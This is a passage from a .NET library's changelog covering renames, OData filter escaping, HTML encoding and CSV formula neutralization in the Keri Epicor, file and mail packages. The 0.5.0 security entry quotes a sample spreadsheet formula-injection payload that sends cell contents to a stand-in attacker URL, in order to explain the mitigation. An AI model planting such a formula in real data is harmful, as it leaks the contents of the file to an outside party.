- **`ExcelReader.WorksheetToDataTable` put values under the wrong headers** when a data row began with an empty cell. Each row is now read across the header's columns. An empty `catch` that discarded row-read errors is removed.
- **`TabularRenderer.ConvertJArrayToHTMLTable` threw** when a row lacked a column present in the first row, or held null. Those cells are now empty.
- **Doc comments** that linked to renamed or removed methods, and public members without documentation.
- **Removed an unverified claim** from the XML docs and guides that OData query options are ignored on REST v1 sessions.

### Security

- **The generated email report no longer includes blind-copy recipients.** `EmailSpecs.EmailBCCRecipients` and `EmailSpecs.EmailRecipientDefault` are omitted from the body `Emailer` builds when `EmailBody` is null.
- **Generated HTML is encoded.** The email report and `ConvertJArrayToHTMLTable` HTML-encode headers and values. An explicit `EmailBody` is inserted as the caller's HTML, as documented.

### Version

- `Keri.RestTransport` 0.4.0 → 0.5.0. `Keri.Epicor` 0.8.0 → 0.9.0. `Keri.Files` 0.6.0 → 0.7.0. `Keri.Mail` 0.6.0 → 0.7.0. `KeriConfigurator` (0.5.0) is unchanged.

## Documentation caught up — 2026-09-16

The renames left the *names* correct everywhere and the *prose* describing a library that no longer exists. This fixes the documents a newcomer actually reads first.

### Changed

- **`README.md`.** Three library projects became four. `FileHandling.Emailer.Send` became `Keri.Mail`'s. The consumption section no longer says "the three DLLs needed" — which DLLs you need now depends on what you use, and the `.csproj` example says so with comments rather than listing all four unconditionally. The dependency table attributes each package to the project that actually pulls it, with a line making the consequence explicit: a consumer who writes spreadsheets and never sends mail takes ClosedXML and nothing else. The project tree describes `Keri.Files` and `Keri.Mail` as they exist rather than a merged `FileHandling`.

- **`CONFIGURATION.md`.** The email example was code that would not compile — `FileProcessing.EmailReport(mailMeta, smtp)` against types that were deleted two releases ago. Rewritten around `MailSpec`, `FileSpec` and `Emailer.SendReport`, including what `FileOperationResult` gives back and why `OutputPath` is still populated when a send fails.

  It also gains a section that had nowhere to live before: **writing a file without sending it.** That is the whole point of splitting `Keri.Files` out, and until now the configuration guide could only show you how to email one.

- **`CONTRIBUTING.md`.** DTO locations, the sample project names, and the POC guidance.

- **Sample project names** throughout: `EpicorSvcDemo` → `KeriDemo`, `EpicorSvcPOCs` → `KeriPocs`.

### Notes

The check that mattered here was not "does it mention the old name" but "would this compile" — several passages named types that no longer exist, which is worse than stale prose because a reader trusts a code block. `EXAMPLES_EPICOR.md` and `EXAMPLES_RESTAPI.md` were checked and needed nothing: they cover the Epicor service surface, which the file/mail split never touched.

### Version

- No version changes. Documentation only.

## Security policy added — 2026-09-16

`SECURITY.md` was written during the Apache-2.0 relicensing work and never made it into the repository — `CLAUDE.md` has been linking to a file that does not exist. This adds it, rewritten for the four-package layout.

### Added

- **`SECURITY.md`.** Vulnerability reporting through GitHub's private advisory flow rather than an email address; an explicit statement that this is an unfunded pre-1.0 project with no response-time commitment and no bounty; scope boundaries; and warranty deferred to Apache 2.0 §7 and §8 rather than restated.

  The substance is the rest of it: what the library does with credentials (holds them in memory, writes nothing, phones nowhere), how to configure each environment, and — at greater length — what it deliberately does *not* do for you. Transport security is determined by the URL you supply; `filters` and service paths are pass-throughs; result objects carry business data you may not want in your logs; destructive operations are gated but not prevented.

  It also names two things the library *does* defend, so a reader knows where the line is: CSV formula neutralization, and `FileWriter.Save` validating `BaseName` as a name rather than a path.

### Notes

Two places where the document declines to overclaim, deliberately:

- **Formula neutralization covers CSV only.** Whether ClosedXML treats a leading `=` in a `DataTable` cell as a formula or as text has not been verified against the pinned 0.105.0, so the document says so instead of guessing. A caller who needs certainty for `.xlsx` is told to neutralize before handing data over.
- **Temp files are never cleaned up.** Attachments written to the system temp folder stay there. That is documented as a retention decision for the operator rather than quietly omitted.

The dependency section now reflects the split: a `Keri.Files` consumer inherits ClosedXML and nothing else, while MailKit, MimeKit and BouncyCastle arrive only with `Keri.Mail`, and only on `net8.0`. That was the argument for splitting `FileHandling`; it is now a property a reader can verify from the table.

### Version

- No version changes. Documentation only.

## Samples renamed — 2026-09-16

Housekeeping after the `Keri.*` rename: the two sample projects were still named after an assembly that no longer exists, and nothing stopped `dotnet pack` from producing packages for the three executables. No library changed; no version moved.

### Changed

- **`EpicorSvcDemo` → `KeriDemo`, `EpicorSvcPOCs` → `KeriPocs`.** Folder, assembly, root namespace and the `.sln` entries. Both were named for `EpicorSvcs`, which became `Keri.Epicor` in the previous release — so they pointed at something that had stopped existing.

- **`KeriConfigurator` deliberately keeps its undotted name.** The dot in `Keri.Epicor`, `Keri.RestTransport`, `Keri.Files` and `Keri.Mail` marks the four projects that go on NuGet, where `namespace == AssemblyName == PackageId`. The configurator, the demo and the POCs ship nothing; giving them package-shaped names would invite the question of where to install them from. This is also how .NET generally names tooling — nobody calls the EF command-line tool `Microsoft.EntityFrameworkCore.Tool`.

### Added

- **`IsPackable=false` on `KeriConfigurator`, `KeriDemo` and `KeriPocs`.** Flagged back at 0.7.4 and not acted on until now: without it, a solution-wide `dotnet pack` emits packages for all three regardless of their lack of package metadata. With it, "dotted means published" stops being a convention someone has to notice and becomes something the build enforces.

### Version

- No version changes. `Keri.Epicor` (0.8.0), `Keri.RestTransport` (0.4.0), `Keri.Files` (0.6.0), `Keri.Mail` (0.6.0) and `KeriConfigurator` (0.5.0) are all unchanged — the renamed projects carry no version of their own, and nothing shipped behaves differently.

## Keri.Epicor 0.8.0 / Keri.RestTransport 0.4.0 — 2026-09-16

The last two library projects move onto the `Keri.*` scheme, and the `REST` acronym takes the casing the .NET design guidelines call for. **Breaking:** assembly names, namespaces, package identifiers, and four public type names all change. No behavior changes — this release renames things and nothing else.

### Changed

- **`EpicorSvcs` → `Keri.Epicor`, `RESTServices` → `Keri.RestTransport`.** Folder, assembly, root namespace, and package identifier, for both. Applied with `git mv` so `git log --follow` and `git blame` carry through the rename rather than stopping at it.

  With `Keri.Files` and `Keri.Mail` already renamed, all four libraries now have `namespace == AssemblyName == PackageId`. Somebody who runs `dotnet add package Keri.Epicor` types `using Keri.Epicor;` and it works — which was not true of any of them a release ago.

- **`RESTServices` becomes `RestTransport`, not `RestServices`.** The project contains a transport — one class that executes HTTP requests — not a collection of services. The repository's own folder layout said so (`RESTServices/Transport/`) and every document called it "the transport"; only the assembly name disagreed.

- **`REST` → `Rest` in type names.** The .NET Framework design guidelines capitalize two-letter acronyms (`IO`, `ID`) and PascalCase anything longer (`Xml`, `Html`, `Uri`). The renames:

  | Was | Now |
  | --- | --- |
  | `RESTConnect` | `RestConnect` |
  | `RESTSessionKey` | `RestSessionKey` |
  | `RESTAuthenticationObject` | `RestAuthenticationObject` |
  | `EpicorRESTSessionKey` | `EpicorRestSessionKey` |
  | `RESTCallAsync` | `RestCallAsync` |
  | `RESTTransactionAsync` | `RestTransactionAsync` |

  `KineticRESTIntegrator` is deliberately untouched — the repository, the solution, and the test project keep their name. So does `EpicorSvc`, the base class: it is singular, it mirrors Epicor's own `BusinessObjectSvc` convention, and the near-collision that made it awkward is gone now that the assembly around it is called `Keri.Epicor`.

- **`Keri.RestServices` → `Keri.RestTransport` as the package identifier.** It had been declared in metadata but never pushed to a feed, so no identifier is being abandoned or squatted.

- **Documentation swept mechanically.** `README.md`, `CONTRIBUTING.md`, `CONFIGURATION.md`, `EXAMPLES_EPICOR.md`, `EXAMPLES_RESTAPI.md` and `CLEANUP_RECOMMENDATIONS.md` now name the projects correctly, as do the solution file, the pre-commit hook's project map, and the README's version and assembly tables. `CHANGELOG.md` was excluded: it is a historical record, and rewriting old entries to name assemblies that did not exist when those entries were written would falsify it.

### Notes

The migration for a consumer is mechanical — change the `using` lines, change the type names in the table above — but it is a full break: every assembly name and namespace in the library changed across 0.5.0 → 0.8.0. There are no external consumers, which is the only reason this is a reasonable thing to do at all. It gets substantially more expensive the day after a package is published, which is why it happened now.

Prose still describing the old architecture — the README's narrative sections, `CONTRIBUTING.md`'s design discussion, `SECURITY.md` — needs an editorial pass rather than a find-and-replace. That is the remaining work before publication.

### Version

- `EpicorSvcs` 0.7.4 → `Keri.Epicor` 0.8.0. `RESTServices` 0.3.3 → `Keri.RestTransport` 0.4.0. `Keri.Files` (0.6.0), `Keri.Mail` (0.6.0), and `KeriConfigurator` (0.5.0) are unchanged.

## Keri.Files 0.6.0 / Keri.Mail 0.6.0 — 2026-09-15

`FileHandling` becomes two assemblies. **Breaking:** the namespaces, the assembly names, and the package identifiers all change; `FileProcessing` no longer exists. No behavior changes — every line of logic here shipped in `FileHandling 0.5.0`.

### Changed

- **`FileHandling` splits into `Keri.Files` and `Keri.Mail`.** `Keri.Files` holds `FileSpec`, `FileWriter`, `FileOperationResult`, `FileStage`, `TabularRenderer`, `ExcelReader` and `ExcelWriter`, and depends on ClosedXML and Newtonsoft.Json. `Keri.Mail` holds `MailSpec`, `EmailSpecs`, `SmtpSettings` and `Emailer`, and depends on MailKit, Newtonsoft.Json, and `Keri.Files`.

  The dependency points one way and can only point one way: sending a report means building one first. Nothing in `Keri.Files` knows `Keri.Mail` exists.

  The reason for the split is what a consumer is made to carry. Writing a CSV previously pulled MailKit, MimeKit and BouncyCastle.Cryptography — roughly 7 MB, and, more to the point, their advisories — onto somebody whose code never opens a socket. `SECURITY.md` already tells consumers that dependencies are theirs to watch; this stops charging them for a feature they do not use.

- **Namespaces are now `Keri.*`, matching the package identifiers.** A consumer who installs `Keri.Files` types `using Keri.Files;`. The `Dtos` sub-namespace is gone — it held three types across two now-separate concerns, and a folder-shaped namespace inside a package this small was structure for its own sake.

- **`FileProcessing` is split and retired.** It held two unrelated jobs, which is precisely why it could not survive a split along that line. The renderers — `ConvertJArrayToCSV`, `ConvertJArrayToHTMLTable`, `GetPropertyNames`, `RemoveColumnToken` — become `Keri.Files.TabularRenderer`. The orchestration moves onto the class that was already doing the sending:

  | Was | Now |
  | --- | --- |
  | `FileProcessing.ConvertJArrayToCSV` | `TabularRenderer.ConvertJArrayToCSV` |
  | `FileProcessing.ConvertJArrayToHTMLTable` | `TabularRenderer.ConvertJArrayToHTMLTable` |
  | `FileProcessing.GetPropertyNames` | `TabularRenderer.GetPropertyNames` |
  | `FileProcessing.RemoveColumnToken` | `TabularRenderer.RemoveColumnToken` |
  | `FileProcessing.EmailReport` | `Emailer.SendReport` |
  | `FileProcessing.IsEmailConfigured` | `Emailer.IsConfigured` |

  `Emailer` now reads as one class with two entry points at different levels: `Send` for a message you have assembled yourself, `SendReport` for the build-and-deliver flow.

- **`InternalsVisibleTo` from `Keri.Files` to `Keri.Mail`.** `SendReport` builds `FileOperationResult` instances, and that construction API is internal on purpose. Making it public to cross an assembly boundary *inside one product* would widen the shipping surface for no consumer benefit.

- **Consumers updated.** `EpicorSvcDemo` references both packages; `KeriConfigurator` references only `Keri.Mail`, since all it uses is `SmtpSettings` and `Emailer.TestConnection`. The test project references both. The solution file, the pre-commit hook's project map, and the README version and assembly tables follow the rename.

### Notes

The `Keri.Files` project keeps `FileHandling`'s `ProjectGuid` so the solution entry survives the rename rather than orphaning; `Keri.Mail` gets a new one.

Version numbers continue `FileHandling`'s lineage rather than restarting — these are its two halves, and starting one of them at `0.1.0` would imply new, untested code when every line here shipped as 0.5.0. They are free to diverge from here.

The wider documentation still describes `FileHandling` in prose — README's architecture narrative, `CONTRIBUTING.md`, `EXAMPLES_*.md`, `CONFIGURATION.md` and `SECURITY.md`. That sweep lands after the remaining renames, so it is written once rather than three times.

### Version

- `FileHandling` 0.5.0 → `Keri.Files` 0.6.0 and `Keri.Mail` 0.6.0. `EpicorSvcs` (0.7.4), `RESTServices` (0.3.3), and `KeriConfigurator` (0.5.0) are unchanged.

## FileHandling 0.5.0 — 2026-09-15

Splits the file half of this library from the email half, adds a save path so a file can be written somewhere and simply kept, and neutralizes spreadsheet formulas in CSV output. **Breaking:** `EMailMeta` is gone and `EmailReport` has a new signature and return type.

### Added

- **`FileWriter.Save(FileSpec)` — write a file and keep it.** Until now the only way to get a spreadsheet out of Keri was to email one; the file was a side effect of `EmailReport`, written to `%TEMP%` and reachable only as an attachment. `Save` takes a destination, writes there, and returns the path.

  `FileSpec.SavePath` names the folder (blank still means temp, which is right when the file exists only to be attached). A folder that does not exist is a `Write` failure unless `FileSpec.CreateDirectory` is set — creating a directory tree is a decision, not a default. An existing file is never overwritten: the name is uniquified the way a browser names a repeated download, `Report.csv` then `Report (1).csv`. Read the winning name off `OutputPath` rather than recomposing it; the existence check and the write are not atomic, so two processes racing for one folder can still collide.

  `BaseName` is validated as a *name*: blank, directory separators, `:`, `.`/`..`, and anything in `Path.GetInvalidFileNameChars()` are rejected at `Build` with nothing written. This is what stops a base name derived from data — a customer name, a report title — from steering the write out of the destination folder. The composed path is re-checked against the resolved folder before the write as well.

- **`FileSpec` and `MailSpec` replace `EMailMeta`.** `FileSpec` is the file: rows, base name, format, date format, sheet name, header map, save path. `MailSpec` is the delivery: recipients, subject, body, error text — and it *has* a `FileSpec` rather than being one, because a message with no attachment is a legitimate case and inheritance would force an attachment-shaped base onto it.

  The reason for the split is what a save-only caller sees. With one flat model, somebody who only wants a spreadsheet on disk opens IntelliSense and finds `To`, `CC`, `BCC`, `Subject`, `Body`, `From`, `RecipientName` and `SMTPHost` staring back — nine properties that do nothing, in a library that on its own cannot send mail.

- **`MailSpec.AttachmentPath` — attach a file that already exists.** Set it and nothing is built; the named file is attached as-is. This is what makes "save it, then mail it" write the file once instead of twice, and it serves the plainly useful case of mailing a file Keri did not produce.

- **`FileOperationResult` and `FileStage`.** Building and delivering a report is a sequence, and when it fails *which step* failed is usually the whole question — so the result carries the step-by-step breakdown (`Steps`) that `EmailReport` always returned, plus the things a program can actually branch on: `IsSuccess`, `OutputPath`, `ErrorMessage`, and `FailedAt`.

  Deliberately not `OperationResult<T>`: that type lives in `EpicorSvcs`, and reusing it would make a CSV writer depend on the ERP client. `FailedAt` plays the part `FailureStage` plays over there without sharing the type.

  `FileStage` has three failure values — `Build`, `Write`, `Send` — and no `Connect` or `Attach`. Attaching, connecting, authenticating and transmitting all happen inside one SMTP client call that surfaces a single error, so the library cannot tell them apart. A stage label that is only sometimes right is worse than a coarse one, because a caller branching on it has no way to know which time it got.

### Security

- **CSV formula injection (CWE-1236) is mitigated.** A value beginning `=`, `+`, `-`, `@`, tab or carriage return is now prefixed with an apostrophe so a spreadsheet application treats it as text.

  This matters here because of what the library is for. Data reaches Epicor from vendor portals, EDI feeds, and keyboards; a part description reading `=HYPERLINK("http://attacker.example"&A1,"Click")` sits inert in the ERP, gets pulled by a BAQ, written to CSV by Keri, and emailed to somebody who double-clicks it. The injection executes on a machine the person who typed it never touched.

  **Numbers are exempt.** A value that parses as a number is left alone, so `-5.00` stays `-5.00` while `-1+1` is prefixed. Prefixing every negative amount would corrupt every credit, variance and adjustment in the file — a mitigation that breaks the common case to catch the rare one is not a mitigation.

  Off by setting `FileSpec.NeutralizeFormulas` to false, or passing `neutralizeFormulas: false` to `ConvertJArrayToCSV`, for a file a machine parses rather than a person opens. Headers are never prefixed; they are the caller's own text, not source data.

  **Not covered:** the Excel path. Whether ClosedXML's `DataTable` insert treats a leading `=` as a formula or as text has not been verified against 0.105.0, so no claim is made either way. Worth checking before relying on it.

### Changed

- **`EmailReport(EMailMeta, SmtpSettings)` → `EmailReport(MailSpec, SmtpSettings)`, returning `FileOperationResult` instead of `List<string>`.** *Breaking (in-solution).* The step list survives on `FileOperationResult.Steps`; `ToString()` renders a headline plus the breakdown, so `Console.WriteLine(result)` prints what the old `string.Join` printed. `EpicorSvcDemo` is the only call site and was updated.

- **`FileSpec.SheetName` falls back to `BaseName` on read, not on assignment.** `EMailMeta` resolved this in the setter, so assigning the sheet name before the attachment name silently produced an empty sheet name. Order no longer matters.

- **`WriteDataToCSVFile` and `WriteDataToExcelFile` are removed.** *Breaking (in-solution).* `EmailReport` was their only caller and now goes through `FileWriter.Save`. Keeping them would have meant shipping two public ways to write a file where one validates its destination and the other builds a path out of `Path.Combine(Path.GetTempPath(), filename)` and writes wherever that lands — including outside temp, since `Path.Combine` discards the first argument when the second is rooted. The pure renderers (`ConvertJArrayToCSV`, `ConvertJArrayToHTMLTable`, `GetPropertyNames`) stay public; writing goes through `FileWriter`.

- **`EpicorSvcDemo` builds the spreadsheet unconditionally, then offers to email it.** Previously an unconfigured relay skipped building the file at all, so a run without SMTP produced nothing to look at — the Excel half of the module could not be demonstrated without a mail server, though the demo's own text called emailing "an optional downstream step." The file now lands in a `DemoOutput` folder beside the executable and the email step attaches it by path.

- **44 more tests** (231 → 275): `FileSpecTests`, `FileWriterTests` (validation, destination handling, collision numbering, header map end-to-end, and an xlsx write that doubles as the ClosedXML binding-redirect canary), and formula-neutralization cases in `CsvRenderingTests`. `FileWriterTests` writes into a GUID-named folder under temp and removes it on dispose.

### Notes

Carried forward, still not changed: `AttachmentType`/`Format` is compared case-insensitively now but is still the file extension verbatim, so `Format = "CSV"` writes `Report.CSV`. CSV is written as UTF-8 with no byte-order mark, matching what the library has always written — a BOM would help Excel read non-ASCII on a double-click and would upset some strict parsers, so it is a decision worth making deliberately rather than a default worth changing quietly.

Still outstanding from the security review: HTML encoding in `ConvertJArrayToHTMLTable` and the auto-generated email body, the BCC disclosure when `EmailSpecs.EmailBody` is null on the direct `Emailer.Send` path, exception objects serialized into `ExcelReader.WorksheetToJArray`'s return value, and temp files that are never cleaned up.

### Version

- `FileHandling` 0.4.0 → 0.5.0. `EpicorSvcs` (0.7.4), `RESTServices` (0.3.3), and `KeriConfigurator` (0.5.0) are unchanged.

## FileHandling 0.4.0 — 2026-09-15

Four defects in the file/email module, and the first tests it has ever had. `FileHandling` was the one library the suite did not reference, which is why all four survived this long.

### Fixed

- **`EMailMeta` held its attachment prefix and sheet name in `private static` fields.** Instance properties backed by static storage: every `EMailMeta` in the process shared one value, so constructing a second one silently renamed the first one's attachment. Two reports built in a single run — or any host handling two at once — produced two files under the same name. Now per-instance. *Behavioral fix; no API change.*

- **A per-message SMTP host override wrote back into the caller's `SmtpSettings`.** `EmailSpecs.smtpspecs` holds a reference, so `EmailReport` applying `EMailMeta.SMTPHost` mutated the instance the composition root built once and reuses. A single overridden message repointed every send after it. Resolution now happens on a private copy (`FileProcessing.ResolveSmtp`); the caller's object is never written to.

- **The CSV writer deleted commas from values instead of quoting them.** `Acme, Inc.` was written as `Acme Inc.` — column count preserved, data silently altered, no error. Embedded quotes and line breaks were unhandled as well. `ConvertJArrayToCSV` now emits RFC 4180: a field containing a comma, a double quote, or a line break is quoted, and embedded quotes are doubled. *This changes the bytes of every CSV containing such a value — for the better, but a downstream parser that relied on commas never appearing will see quoted fields now.*

- **`AttachmentHeaderMap` was ignored on the CSV path.** `EmailReport` passed the map to `WriteDataToExcelFile` but not to `WriteDataToCSVFile`, so the same `EMailMeta` produced an xlsx that honored the rename/remove map and a csv that did not. The map is now passed, and the CSV writer honors `REMOVE_COLUMN` the way the Excel writer does — dropping the header *and* the values. (Passing the map through without that would have produced a column literally headed `REMOVE_COLUMN`, which is worse than ignoring it.)

- **`AttachmentName` threw on the documented `null` date format.** The getter called `AttachmentDateFormat.ToLower()` one line *before* the `AttachmentDateFormat == null` guard, so the null the XML doc lists as valid raised a `NullReferenceException` and the guard was unreachable. Null, empty, and `none` (any casing) now all suppress the date suffix. *Fixed in the same property as the static-field defect above; it is not independently reachable once tests exist for that property.*

### Added

- **`FileProcessing.RemoveColumnToken`** — the `"REMOVE_COLUMN"` sentinel as a public constant. It was a bare literal duplicated between `ExcelWriter` and the caller's map; the CSV path now has to agree with it, and two copies of a magic string that must match is how they stop matching.

- **34 offline tests for `FileHandling`**, under `KineticRESTIntegrator.Tests/Files/`: `EMailMetaTests` (instance isolation, the date-suffix rules, the sheet-name fallback), `CsvRenderingTests` (RFC 4180 escaping, header-map rename and removal, column alignment when a row is missing a property), and `SmtpResolutionTests` (copy fidelity and the non-mutation guarantee). No network, no temp files, no ClosedXML — same offline/deterministic character as the rest of the suite.

### Changed

- **The test project references `FileHandling`.** It previously referenced only `EpicorSvcs`. The reference brings ClosedXML onto this `net48` project, so `AutoGenerateBindingRedirects` / `GenerateBindingRedirectsOutputType` and an `MSB3277` suppression were added to match what `FileHandling.csproj` already carries — without the redirects, ClosedXML-backed tests fail at runtime with an assembly-version `FileLoadException` that reads like a broken test. MailKit does not come along: it is `net8.0`-only in `FileHandling`, and this project is `net48`.

- **`InternalsVisibleTo("KineticRESTIntegrator.Tests")` on `FileHandling`.** `ResolveSmtp` is an implementation detail; making it public purely so a test could reach it would widen the shipping API for no consumer benefit. The alternative — driving it through `EmailReport` — means attempting a real send, which the offline suite will not do.

### Notes

Three things found while reading, deliberately **not** changed here:

- `WriteDataToCSVFile` does not null-check `data` the way `WriteDataToExcelFile` does, so null data yields an empty `.csv` attachment on the CSV path and no attachment on the Excel path. `README.md` documents the Excel behavior as the contract. Diverging, but the fix is a behavior decision, not a bug fix.
- `AttachmentType` is compared with `== "csv"` exactly, so `"CSV"` silently routes to the Excel writer and produces an xlsx named `.CSV`. The value is also unvalidated and becomes the file extension verbatim.
- `EmailReport` with a null `SmtpSettings` previously threw inside the try block and recorded a step error; it now proceeds with the neutral defaults and fails at the send instead. Same outcome — a failure in the returned step list — by a different route.

### Version

- `FileHandling` 0.3.1 → 0.4.0. The CSV output format changes for any value containing a comma, a quote, or a line break, which is altered runtime behavior rather than a pure fix. `EpicorSvcs` (0.7.4), `RESTServices` (0.3.3), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.7.4 / RESTServices 0.3.3 / FileHandling 0.3.1 — 2026-09-10

Adds the NuGet package metadata the three library projects were missing. No code changed; the version bumps mark that the produced artifact differs.

### Added

- **Package metadata on `RESTServices`, `EpicorSvcs`, and `FileHandling`.** `PackageId`, `PackageLicenseExpression`, `PackageProjectUrl`, `RepositoryUrl`, `RepositoryType`, `PackageTags`, `PackageReadmeFile`, and `PackageRequireLicenseAcceptance`, plus `Authors` and a filled-in `Company` (both were empty). Each project also packs the repository README so a gallery page has content.

  The one that matters is `PackageLicenseExpression`. Without it `dotnet pack` produces an artifact carrying **no declared license at all**, regardless of what `LICENSE` says at the repository root — which would have quietly undone the decision to license under Apache 2.0.

- **Package identifiers follow the naming `CLEANUP_RECOMMENDATIONS.md` proposed:** `Keri.RestServices`, `Keri.Epicor`, `Keri.FileHandling`. The assembly names are unchanged. The default identifier would have been the assembly name — `RESTServices` and `FileHandling` are far too generic to claim on a public feed, and neither says what the package is.

### Notes

Nothing is published yet and no feed has been chosen. This makes the projects *packable correctly* when that decision is made; it does not make it.

The executables (`KeriConfigurator`, `EpicorSvcDemo`, `EpicorSvcPOCs`) carry no package metadata and are not marked `IsPackable=false`, so a solution-wide `dotnet pack` would still emit packages for them. Worth setting before any real packing run.

### Version

- `EpicorSvcs` 0.7.3 → 0.7.4, `RESTServices` 0.3.2 → 0.3.3, `FileHandling` 0.3.0 → 0.3.1. `KeriConfigurator` (0.5.0) is unchanged.

## EpicorSvcs 0.7.3 — 2026-09-10

Adds `ODataFilter`, a clause builder for the `filters` parameter. Values travel as their own argument, so the library escapes them rather than the caller remembering to. Purely additive — every hand-written filter string keeps working exactly as before.

### Added

- **`ODataFilter` — OData `$filter` clause construction.** `Eq`, `Ne`, `Gt`, `Ge`, `Lt`, `Le`, `IsNull`, `IsNotNull`, `Contains`, `StartsWith`, `EndsWith`, `EqualsIgnoreCase`, `ContainsIgnoreCase`, `In`, `And`, `Or`, `Not`, plus the primitives `Field`, `Literal`, `Raw` and `Escape`. Every method returns a plain clause string, so it drops into the existing `filters: List<string>` parameter with no change to any service — the services already join that list with `and`.

  The reason it exists: `filters` takes raw OData, which means a value interpolated into a clause by the caller is syntax as much as data. A value containing an apostrophe closes the literal early, and a crafted value can widen what the filter matches — the same shape as SQL injection, and unreachable by the library once the string has been assembled. Passing the field and the value separately is what lets the escaping happen inside Keri.

  `Or` parenthesizes, so an alternative dropped into the `and`-joined `filters` list cannot leak precedence into the surrounding clauses. `In` expands to an `or` chain rather than OData's `in` operator, so it does not depend on which dialect the endpoint implements. Field references are validated — an identifier, or identifiers joined by `/` for a navigation path such as `Customer/CustID` — because a field name is syntax that escaping cannot make safe. Numbers use the invariant culture, so a machine set to a comma decimal separator still emits `1.5`. An unsupported type throws rather than falling back to `ToString()`, since a silently stringified value produces a filter that looks valid and matches nothing.

  This escapes; it does not validate. Whether a value is a plausible PO number remains the application's question to answer.

- **`ODataFilterTests`** — 43 offline cases covering each operator, every supported type, the crafted-value case, field-reference rejection, composition and nesting, and decimal formatting under a comma-decimal culture.

### Changed

- **`EpicorSvc.EscapeODataLiteral()` delegates to `ODataFilter.Escape()`.** Same behavior, one implementation. The helper stays `protected internal static` so the eight internal call sites from 0.7.1 are untouched; `ODataFilter.Escape` is the public entry point.

### Notes

A `DateTime` whose `Kind` is `Unspecified` — what `DateTime.Parse("2026-01-15")` produces — is treated as UTC, not local. Pass a `DateTimeOffset` where the offset matters.

Dates, GUIDs and the `contains` / `startswith` / `endswith` functions are emitted in their OData v4 forms. Epicor's v2 endpoint is v4, so this should be correct, but it has not yet been confirmed against a live install — worth one filtered call before relying on a date filter.

### Version

- `EpicorSvcs` 0.7.2 → 0.7.3. `RESTServices` (0.3.2), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.7.2 / RESTServices 0.3.2 — 2026-08-25

`ResourcePath` is now populated on success as well as on failure, so every result records the URL the call actually used. The URL is what identifies the API version — an `/api/v1/` path is the Basic-auth v1 endpoint, `/api/v2/odata/{Company}/` is the API-key v2 OData endpoint — and that distinction decides whether OData query options are honored or silently dropped.

### Changed

- **The transport reports the URL it called on every response.** `RESTConnect.RESTCallAsync` attached the `resource` property only when the response carried an `ErrorMessage`, so a successful call left `OperationResult.ResourcePath` null and there was no record of which endpoint had been reached. It is now attached unconditionally. The request `payload` is still attached on failures only — it exists for diagnosis, not for logging every successful write. `RESTServices` — 0.3.2.

- **`ToOperationResult` carries the resource path on both paths.** It read `resource` inside the failure branch; it now reads it once and passes it to `Success(...)` as well as `Failure(...)`.

- **`HandleResponse` preserves the resource path across an unwrap.** Unwrapping a `returnObj` or `parameters` envelope returns the inner object and discarded the transport properties along with it. The resource URL is now copied onto the unwrapped dataset, so the roughly seventy call sites that normalize before converting keep it.

### Notes

No new type, property, or configuration was added for API-version reporting. The endpoint shape already carries the answer, and the fix was to stop dropping it — the alternatives considered (a stamped version field threaded through the transport, or a version argument at all ~128 result-construction sites) were more machinery for information the URL already holds.

### Version

- `EpicorSvcs` 0.7.1 → 0.7.2, `RESTServices` 0.3.1 → 0.3.2. `FileHandling` (0.3.0) and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.7.1 — 2026-08-25

Escapes caller-supplied text in OData `$filter` clauses. A value containing a single quote previously closed the literal early and produced a malformed filter.

### Fixed

- **Single quotes in `$filter` values are escaped.** OData escapes a quote by doubling it. Eight clauses built from caller text did not: `GetByPONumAsync` (`PONum`), `GetPartsBySearchWordsAsync` (`SearchWord`), `GenxDataSvc` (`TypeCode`), and `UDXSvc.QueryAsync`'s five key clauses (`Key1`–`Key5`). A customer ID containing an apostrophe, or a UD key carrying one, produced a filter Epicor rejects — or, worse, misreads. All eight now pass through the new `EpicorSvc.EscapeODataLiteral()`. The UD keys are the likeliest to hit this in practice, since UD rows are commonly keyed on names and other free-text identifiers.

### Added

- **`EpicorSvc.EscapeODataLiteral()`** — `protected internal static`, alongside the other shared service helpers. Doubles single quotes and treats null as empty. Only the single quote terminates an OData string literal; everything else is a URL-encoding concern and is left untouched. Covered by offline `ODataLiteralTests`.

### Version

- `EpicorSvcs` 0.7.0 → 0.7.1. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.7.0 — 2026-08-25

`GetByPONumAsync` stops guessing when a PO number matches more than one order. **Minor rather than patch: this changes documented runtime behavior** — a call that previously returned an order for a duplicated PO now returns a failure.

### Changed

- **`SalesOrderSvc.GetByPONumAsync` counts its matches.** *Breaking.* The method's remarks asserted that "PO numbers are expected to be unique per order at the Epicor installation level — at most one order will match," and the implementation queried with `top: 1` and returned whichever row came back first. Epicor's default is indeed to require unique PO numbers per customer, but a company can be configured to allow duplicates, and orders created before such a setting changed survive it either way — so the assumption was not safe, and when it broke the method silently returned the wrong order. The query now uses `top: 2`, which is one row more than needed to tell "exactly one" from "more than one", and the three outcomes are explicit: no match is a 404 naming the PO; exactly one match returns that order's dataset as before; more than one is a 409 naming the colliding order numbers and pointing at `SalesOrdersAsync`. The method will not choose on the caller's behalf.

  A company-configuration read was considered and rejected: it would cost a round trip, depend on a setting whose field name would need confirming against Epicor's REST help, and still not catch historical duplicates created before the setting was last changed. Counting the result answers the question directly.

### Version

- `EpicorSvcs` 0.6.2 → 0.7.0. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.6.2 — 2026-08-25

Extends the commit-boundary vocabulary introduced in 0.6.1 to the remaining five orchestrators, so every multi-step write in the library now reports which side of its commit a failure landed on. Additive — no existing behavior changes.

### Added

- **`FailureStage` on `AddOrderLineAsync`, `MoveInventoryAsync`, `AddMtlsAsync`, `CreateQuoteAsync`, and `CreateProjectAsync`.** Each identifies its commit boundary — `MasterUpdate` for order lines, `CommitTransferAndUpdateHistory` for inventory, `Update` for materials, quotes, and projects — marks every failure before it `Uncommitted`, and classifies the commit's own result. With `CreateOrderAsync` from 0.6.1, all six orchestrators now carry the label.

- **`EpicorSvc.MarkIndeterminate<T>()`.** For the case the other two helpers don't cover: Epicor accepted the write and then returned a response the orchestrator could not build its result from. The operation failed but a record exists, so a blind retry would create a second one. `CreateQuoteAsync` (a saved quote with no `QuoteNum` in the response) and `CreateProjectAsync` (a saved project with no row in the returned dataset) both hit this.

